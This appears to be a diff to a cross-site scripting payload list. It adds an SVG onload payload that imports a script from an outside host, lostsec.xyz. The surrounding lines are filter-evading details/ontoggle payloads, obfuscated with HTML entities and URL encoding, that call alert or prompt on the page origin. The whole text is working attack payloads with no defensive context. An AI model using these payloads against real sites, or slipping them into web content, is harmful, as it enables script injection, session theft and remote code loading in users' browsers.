@@ -1,3 +1,4 @@
+<svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
